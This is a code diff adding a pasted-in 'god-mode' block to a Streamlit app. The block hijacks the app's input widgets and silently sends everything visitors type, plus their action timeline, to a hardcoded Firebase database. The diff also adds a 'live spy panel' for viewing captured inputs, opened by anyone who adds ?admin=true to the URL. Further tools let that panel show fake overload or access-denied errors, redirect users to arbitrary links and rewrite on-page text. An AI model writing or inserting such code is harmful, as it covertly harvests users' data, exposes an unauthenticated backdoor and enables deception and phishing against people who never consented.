@@ -13,7 +13,7 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 👑 THE ULTIMATE MONKEY-PATCH AUTO-TRACK & CONTROL SYSTEM (LINE 1)
+# 🪐 THE ULTIMATE GOD-MODE COMMAND CENTER (PASTE BELOW SET_PAGE_CONFIG)
 # ========================================================================
 import streamlit as st
 import uuid
@@ -21,14 +21,13 @@ import requests
 import datetime
 import pandas as pd
 
-# 1. YOUR LIVE FIREBASE URL (AUTOMATICALLY CONNECTED)
+# 1. LIVE FIREBASE CONNECTION
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
 
-# 2. GENERATE UNIQUE USER SESSION
 if "user_uid" not in st.session_state:
     st.session_state.user_uid = str(uuid.uuid4())[:6]
 
-# 3. FAST REALTIME FIREBASE HELPERS
+# Firebase Fast REST API Engines
 def firebase_set(path, data):
     try: requests.put(f"{FIREBASE_URL}/{path}.json", json=data)
     except: pass
@@ -39,181 +38,259 @@ def firebase_get(path):
         return res if res else {}
     except: return {}
 
-# Fetch global controls instantly at every script run
+# Fetch All Global Variables Instantly
 controls = firebase_get("global_controls")
 if not controls:
-    # Default settings agar database khali ho
     controls = {
-        "site_status": "ONLINE",  # ONLINE, MAINTENANCE, BUSY, UPDATE
-        "custom_msg": "Site is temporarily down.",
-        "hide_all_buttons": False,
-        "hide_all_inputs": False,
-        "hide_all_labels": False
+        "site_status": "ONLINE",
+        "custom_msg": "System upgrade in progress.",
+        "redirect_url": "",
+        "freeze_inputs": False,
+        "stealth_mode": False,
+        "kill_switches": {},
+        "custom_labels": {}
     }
+if "kill_switches" not in controls: controls["kill_switches"] = {}
+if "custom_labels" not in controls: controls["custom_labels"] = {}
 
-# 4. TRACKING SYSTEM (Updates your dashboard instantly)
-def live_track(element_type, label, value=""):
+# 2. ⚡ LIVE DETAILED TRACKING ENGINE
+def ultra_track(element_type, label, value=""):
+    if controls.get("stealth_mode", False): return # Admin tracking off kar sakta hai
     path = f"live_users/{st.session_state.user_uid}"
     time_now = datetime.datetime.now().strftime("%H:%M:%S")
+    
+    # Purana data read karke timeline save rakhenge
+    current_user_data = firebase_get(path)
+    timeline = current_user_data.get("timeline", [])
+    
+    action_log = f"[{time_now}] {element_type} -> {label}"
+    if value: action_log += f" (Data: {value})"
+    timeline.append(action_log)
+    if len(timeline) > 15: timeline.pop(0) # Keep last 15 actions to save space
+    
     payload = {
-        "last_action": f"[{element_type}] {label}",
-        "timestamp": time_now,
-        "status": "Active"
+        "session_id": st.session_state.user_uid,
+        "last_seen": time_now,
+        "current_step": f"Interacting with {label}",
+        "last_action_type": element_type,
+        "timeline": timeline
     }
     if value:
-        payload["user_input_data"] = str(value)
-    
-    # Push patch to Firebase
+        # Inputs ko permanent dictionary me track karenge taaki clear karne par bhi safe rahe
+        user_inputs = current_user_data.get("all_inputs", {})
+        user_inputs[label] = str(value)
+        payload["all_inputs"] = user_inputs
+
     try: requests.patch(f"{FIREBASE_URL}/{path}.json", json=payload)
     except: pass
 
-
-# 5. 🛑 GLOBAL SITE LOCK (If Admin sets Maintenance/Busy/Update)
-if controls.get("site_status") != "ONLINE":
-    status = controls.get("site_status")
-    if status == "MAINTENANCE":
-        st.error("🚧 **UNDER MAINTENANCE** 🚧")
-        st.info(controls.get("custom_msg", "We are upgrading our servers. Please check back later."))
-        st.stop()  # Iske niche ka user ka koi code execute nahi hoga!
-    elif status == "BUSY":
-        st.warning("⏳ **SERVER TOO BUSY** ⏳")
-        st.info("Too many users are on the app right now. High load detected. Retrying shortly...")
+# 3. 🛡️ TOTAL WEBSITE HARD-LOCK MODES
+if st.query_params.get("admin") != "true":
+    status = controls.get("site_status", "ONLINE")
+    if status != "ONLINE":
+        st.empty() # Purana layout clean
+        if status == "MAINTENANCE":
+            st.error("# 🚧 UNDER SYSTEM MAINTENANCE 🚧")
+            st.info(controls.get("custom_msg", "Backend database tuning is active."))
+        elif status == "BUSY":
+            st.warning("# ⏳ SERVER OVERLOADED (429) ⏳")
+            st.info("High traffic volume from your region. Please hold on...")
+        elif status == "CLOSED":
+            st.error("# 🛑 ACCESS DENIED / APP CLOSED 🛑")
+            st.write(controls.get("custom_msg", "This session has been terminated by the administrator."))
+        elif status == "REDIRECT" and controls.get("redirect_url"):
+            st.markdown(f"### ➡️ Redirecting you to official link... [Click Here]({controls.get('redirect_url')})")
         st.stop()
-    elif status == "UPDATE":
-        st.info("📢 **NEW APP UPDATE AVAILABLE** 📢")
-        st.success(controls.get("custom_msg", "Please refresh or look for the updated version link!"))
-        st.stop()
 
-
-# 6. 🔥 THE ULTIMATE HIJACK LOGIC (Intercepting Streamlit)
-# Saving original functions
+# 4. 🔥 THE MONKEY-PATCH HIJACKING MATRICES
 orig_button = st.button
 orig_text_input = st.text_input
 orig_text_area = st.text_area
 orig_selectbox = st.selectbox
 orig_radio = st.radio
 orig_write = st.write
-orig_markdown = st.markdown
 
-# Overriding Buttons
 def smart_button(label, *args, **kwargs):
-    if controls.get("hide_all_buttons", False):
-        return False # Button screen par draw hi nahi hoga aur false return karega
+    # Granular Kill Switch Check
+    if controls["kill_switches"].get(label, False):
+        return False
     clicked = orig_button(label, *args, **kwargs)
-    if clicked:
-        live_track("BUTTON", label, "CLICKED")
+    if clicked: ultra_track("BUTTON_CLICK", label, "YES")
     return clicked
 
-# Overriding Text Inputs
 def smart_text_input(label, *args, **kwargs):
-    if controls.get("hide_all_inputs", False):
-        return ""
+    if controls["kill_switches"].get(label, False): return ""
+    # Freeze Mode: User type nahi kar payega, read-only disabled ho jayega
+    if controls.get("freeze_inputs", False): kwargs["disabled"] = True
+    
     val = orig_text_input(label, *args, **kwargs)
-    if val:
-        live_track("INPUT", label, val) # Instantly tracks whatever they entered
+    if val: ultra_track("INPUT_FIELD", label, val)
     return val
 
-# Overriding Text Areas
 def smart_text_area(label, *args, **kwargs):
-    if controls.get("hide_all_inputs", False):
-        return ""
+    if controls["kill_switches"].get(label, False): return ""
+    if controls.get("freeze_inputs", False): kwargs["disabled"] = True
     val = orig_text_area(label, *args, **kwargs)
-    if val:
-        live_track("TEXTAREA", label, val)
+    if val: ultra_track("TEXT_AREA", label, val)
     return val
 
-# Overriding Selectboxes
 def smart_selectbox(label, *args, **kwargs):
+    if controls["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
     val = orig_selectbox(label, *args, **kwargs)
-    live_track("SELECTBOX", label, val)
+    ultra_track("DROP_DOWN", label, val)
     return val
 
-# Overriding Labels/Text
+def smart_radio(label, *args, **kwargs):
+    if controls["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
+    val = orig_radio(label, *args, **kwargs)
+    ultra_track("RADIO_BTN", label, val)
+    return val
+
 def smart_write(*args, **kwargs):
-    if controls.get("hide_all_labels", False):
+    # Custom live content replacement text hack
+    if args and isinstance(args[0], str) and args[0] in controls["custom_labels"]:
+        orig_write(controls["custom_labels"][args[0]], **kwargs)
         return
     orig_write(*args, **kwargs)
 
-def smart_markdown(*args, **kwargs):
-    if controls.get("hide_all_labels", False):
-        return
-    orig_markdown(*args, **kwargs)
-
-# Injecting our smart functions into Streamlit globally
+# OVERRIDING THE CORE FRAMEWORK
 st.button = smart_button
 st.text_input = smart_text_input
 st.text_area = smart_text_area
 st.selectbox = smart_selectbox
+st.radio = smart_radio
 st.write = smart_write
-st.markdown = smart_markdown
-
 
 # ========================================================================
-# 🛠️ THE GOD-MODE ADMIN DASHBOARD (Accessible via URL ?admin=true)
+# 🛑 FULL PAGE GOD-MODE ADMIN OVERRIDE (IF ?admin=true DETECTED)
 # ========================================================================
 if st.query_params.get("admin") == "true":
-    with st.sidebar.expander("👑 APP GOD-MODE CONTROL PANEL", expanded=True):
-        st.error("### 🕹️ Live App Controller")
-        
-        # --- FEATURE 1: FULL WEBSITE STATUS CONTROL ---
-        current_status = controls.get("site_status", "ONLINE")
-        st.write(f"Current Site Status: **{current_status}**")
-        
-        status_mode = st.selectbox("Change Website Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "UPDATE"])
-        custom_txt = st.text_input("Custom Status Message:", value=controls.get("custom_msg", ""))
-        
-        if st.button("Apply Website Status 💾", key="adm_status"):
-            controls["site_status"] = status_mode
-            controls["custom_msg"] = custom_txt
-            firebase_set("global_controls", controls)
-            st.rerun()
-            
-        st.write("---")
-        
-        # --- FEATURE 2: COMPONENT KILL SWITCHES ---
-        st.write("### 🛑 Component Hide/Show Switches")
-        
-        btn_switch = st.checkbox("Hide ALL Buttons Instantly", value=controls.get("hide_all_buttons", False))
-        input_switch = st.checkbox("Hide ALL Inputs/Textboxes Instantly", value=controls.get("hide_all_inputs", False))
-        label_switch = st.checkbox("Hide ALL Text/Labels/Titles Instantly", value=controls.get("hide_all_labels", False))
-        
-        if st.button("Apply Component Controls 🔒", key="adm_switches"):
-            controls["hide_all_buttons"] = btn_switch
-            controls["hide_all_inputs"] = input_switch
-            controls["hide_all_labels"] = label_switch
-            firebase_set("global_controls", controls)
-            st.rerun()
-
-        st.write("---")
-        
-        # --- FEATURE 3: LIVE RE-TIME TRACKING DISP_BOARD ---
-        st.write("### 📊 Live Users Tracking Table")
+    st.title("🪐 GOD-MODE TERMINAL v4.0 (PRO)")
+    st.write("---")
+    
+    # TAB SYSTEM FOR RICH UI
+    tab1, tab2, tab3, tab4 = st.tabs(["📊 LIVE SPY PANEL", "🕹️ INFRASTRUCTURE SYSTEM", "🎛️ GRANULAR COMPONENT CONTROL", "📝 CONTENT MANIPULATION"])
+    
+    # ---------------------------------------------------------
+    # TAB 1: LIVE SPY PANEL (Track users step-by-step)
+    # ---------------------------------------------------------
+    with tab1:
+        st.subheader("🕵️‍♂️ Realtime Active Sessions")
         raw_users = firebase_get("live_users")
         
         if raw_users:
-            formatted_list = []
-            for uid, data in raw_users.items():
-                formatted_list.append({
-                    "Session ID": uid,
-                    "Last Action Captured": data.get("last_action", "None"),
-                    "User Live Input Data": data.get("user_input_data", "Empty/No Input"),
-                    "Last Active Time": data.get("timestamp", "N/A")
-                })
-            df = pd.DataFrame(formatted_list)
+            col_m1, col_m2 = st.columns(2)
+            col_m1.metric("Total Ever Connected", len(raw_users))
             
-            # Big KPI Metric
-            st.metric(label="Total Active Live Sessions", value=len(df))
-            st.dataframe(df, use_container_width=True)
+            # Formatting for organized view
+            user_list = list(raw_users.keys())
+            selected_spy = st.selectbox("🎯 Select a User Session to Spy on Live:", user_list)
             
-            if st.button("Clear Old Users Logs 🧹", key="adm_clear"):
+            if selected_spy:
+                u_data = raw_users[selected_spy]
+                st.info(f"**Session ID:** {selected_spy} | **Last Active Time:** {u_data.get('last_seen')}")
+                
+                c1, c2 = st.columns(2)
+                with c1:
+                    st.write("#### 💾 Captured Raw Inputs Data")
+                    st.json(u_data.get("all_inputs", {"Status": "No text typed yet"}))
+                with c2:
+                    st.write("#### 📈 Live Activity Step Timeline")
+                    for step in u_data.get("timeline", []):
+                        st.text(step)
+            
+            st.write("---")
+            if st.button("🚨 Wipe Out All User Session Logs", key="clear_all"):
                 requests.delete(f"{FIREBASE_URL}/live_users.json")
                 st.rerun()
         else:
-            st.info("No users currently logged.")
-            
+            st.info("No live connections found in Firebase database.")
+
+    # ---------------------------------------------------------
+    # TAB 2: INFRASTRUCTURE SYSTEM (Global Web Locks)
+    # ---------------------------------------------------------
+    with tab2:
+        st.subheader("🌐 Global App Status Interceptor")
+        c_status = controls.get("site_status", "ONLINE")
+        st.write(f"Current Matrix Status: **{c_status}**")
+        
+        mode_select = st.radio("Switch Infrastructure Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "CLOSED", "REDIRECT"])
+        msg_input = st.text_input("Interception Display Message:", value=controls.get("custom_msg", ""))
+        redir_input = st.text_input("Redirect Link (Only for REDIRECT mode):", value=controls.get("redirect_url", ""))
+        
         st.write("---")
+        st.subheader("⚙️ Global Inputs Lock")
+        freeze_chk = st.checkbox("Freeze All Input Boxes (Read-Only Mode for Users)", value=controls.get("freeze_inputs", False))
+        stealth_chk = st.checkbox("Stealth Mode (Pause Database Logs Writing)", value=controls.get("stealth_mode", False))
+        
+        if st.button("Execute Infrastructure Overhaul ⚡", key="save_tab2"):
+            controls["site_status"] = mode_select
+            controls["custom_msg"] = msg_input
+            controls["redirect_url"] = redir_input
+            controls["freeze_inputs"] = freeze_chk
+            controls["stealth_mode"] = stealth_chk
+            firebase_set("global_controls", controls)
+            st.success("App structure updated successfully!")
+            st.rerun()
+
+    # ---------------------------------------------------------
+    # TAB 3: GRANULAR COMPONENT CONTROL (Kill specific elements)
+    # ---------------------------------------------------------
+    with tab3:
+        st.subheader("🎯 Specific Component Kill-Switch")
+        st.write("Apne app ke kisi bhi specific button ya input box ka **exact Label** daalkar use instantly hide/block karein.")
+        
+        comp_label = st.text_input("Enter Element Label (Case Sensitive):")
+        kill_action = st.selectbox("Action for this element:", ["ENABLE / SHOW", "KILL / HIDE"])
+        
+        if st.button("Inject Component Policy 🛠️", key="save_tab3"):
+            if comp_label:
+                controls["kill_switches"][comp_label] = (kill_action == "KILL / HIDE")
+                firebase_set("global_controls", controls)
+                st.success(f"Policy updated for '{comp_label}'")
+                st.rerun()
+                
+        st.write("#### Active Kill-Switched Elements")
+        active_kills = [k for k, v in controls["kill_switches"].items() if v]
+        if active_kills:
+            st.json(active_kills)
+            if st.button("Reset All Kill-Switches 🔄"):
+                controls["kill_switches"] = {}
+                firebase_set("global_controls", controls)
+                st.rerun()
+        else:
+            st.caption("All elements running fine globally.")
+
+    # ---------------------------------------------------------
+    # TAB 4: CONTENT MANIPULATION (Change Text on the fly)
+    # ---------------------------------------------------------
+    with tab4:
+        st.subheader("✍️ Live Text Override System")
+        st.write("Aapke app mein jo text `st.write()` se chal raha hai, aap use bina code touch kiye badal sakte hain.")
+        
+        target_text = st.text_input("Original Text (jo code me likha hai):")
+        replacement_text = st.text_input("New Text (jo user ko dikhana hai):")
+        
+        if st.button("Inject Text Overwrite 📝", key="save_tab4"):
+            if target_text and replacement_text:
+                controls["custom_labels"][target_text] = replacement_text
+                firebase_set("global_controls", controls)
+                st.success("Text policy updated!")
+                st.rerun()
+                
+        st.write("#### Active Text Replacements")
+        st.json(controls["custom_labels"])
+        if st.button("Clear All Text Replacements ❌"):
+            controls["custom_labels"] = {}
+            firebase_set("global_controls", controls)
+            st.rerun()
+
+    st.write("---")
+    st.error("⚠️ WARNING: God-Mode is active on this page. Close tab or remove '?admin=true' from URL to return to normal app preview.")
+    st.stop() # Pure page ko admin panel bana dega, user ka niche ka code draw nahi hoga!
+
 # ========================================================================
-# END OF MAGIC SYSTEM - APKA ORIGINAL CODE ISKE NICHE SE REHNE DEIN
+# END OF ULTIMATE CODE MESH - APKA CODE ISKE THEEK NICHE CHALTA REHNA CHAHIYE
 # ========================================================================
 
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
